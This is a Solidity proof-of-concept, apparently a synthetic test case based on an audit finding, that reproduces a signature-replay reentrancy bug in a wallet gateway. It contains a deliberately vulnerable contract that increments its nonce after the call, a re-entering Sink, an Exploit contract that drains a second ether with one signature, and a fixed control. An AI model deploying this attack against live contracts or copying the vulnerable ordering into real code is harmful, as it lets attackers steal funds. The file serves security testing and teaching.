// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  BLS Wallet VerificationGateway — nonce is incremented after the call
    (Sigma Prime, finding 19279, processBundle).

    SYNTHETIC, cheatcode-free. One ECDSA signature authorizes a 1 ether
    payment to the sink at nonce 0. The signature was precomputed offline.
    The sink's receive() calls process again before nonce is incremented,
    so the same signature pays a second ether.

    The control increments the nonce before the call. The nested process
    reverts and the sink keeps 1 ether. */

contract Gateway {
    address public constant OWNER = 0x0D304dAafB7eD12fE838a1De04711d9bBb6d729b;

    uint256 public nonce;

    function fund() external payable {}

    function recover(uint256 value, uint256 nonce_, uint8 v, bytes32 r, bytes32 s) public pure returns (address) {
        bytes32 inner = keccak256(abi.encode(nonce_, value));
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", inner));
        return ecrecover(digest, v, r, s);
    }

    function process(address to, uint256 value, uint8 v, bytes32 r, bytes32 s) external virtual {
        require(recover(value, nonce, v, r, s) == OWNER, "sig");
        (bool ok,) = to.call{value: value}("");
        require(ok, "call");
        this.commitNonce();
    }

    function commitNonce() external {
        require(msg.sender == address(this), "only self");
        // @> VULN: the nonce is incremented after the call, so a reentering process still sees the signed nonce.
        uint256 bumped = nonce + 1;
        nonce = bumped;
        // FIX: increment nonce before the external call.
    }
}

contract GatewayFixed is Gateway {
    function process(address to, uint256 value, uint8 v, bytes32 r, bytes32 s) external override {
        require(recover(value, nonce, v, r, s) == OWNER, "sig");
        nonce += 1;
        (bool ok,) = to.call{value: value}("");
        require(ok, "call");
    }
}

contract Sink {
    Gateway public gateway;
    bool public replayed;
    address public to;
    uint256 public value;
    uint8 public v;
    bytes32 public r;
    bytes32 public s;

    function arm(Gateway g, address _to, uint256 _value, uint8 _v, bytes32 _r, bytes32 _s) external {
        gateway = g;
        to = _to;
        value = _value;
        v = _v;
        r = _r;
        s = _s;
    }

    receive() external payable {
        if (!replayed) {
            replayed = true;
            try gateway.process(to, value, v, r, s) {} catch {}
        }
    }
}

contract Exploit {
    uint8 public constant V = 27;
    bytes32 public constant R = 0xcff25114537b6bb7bad341ccc9461c587c07f1590e8e97f5dcc611ae3d075af2;
    bytes32 public constant S = 0x68d29dafddb8e4248a24c2313cb615ccbb9ab50ae2160d7900b1f19790feda6c;
    uint256 public constant PAY = 1 ether;
    uint256 public constant N = 1 ether;

    Gateway public gateway;
    Sink public sink;
    uint256 public received;

    constructor() {
        gateway = new Gateway();
        sink = new Sink();
    }

    function run() external payable {
        require(msg.value == 2 ether, "need 2 ether");
        gateway.fund{value: 2 ether}();
        sink.arm(gateway, address(sink), PAY, V, R, S);
        require(gateway.recover(PAY, 0, V, R, S) == gateway.OWNER(), "precompute");
        uint256 beforeBal = address(sink).balance;
        gateway.process(address(sink), PAY, V, R, S);
        received = address(sink).balance - beforeBal;
        require(sink.replayed(), "signature was not replayed");
        require(gateway.nonce() == 2, "nonce did not move twice");
        require(received == PAY + N, "harm");
    }
}
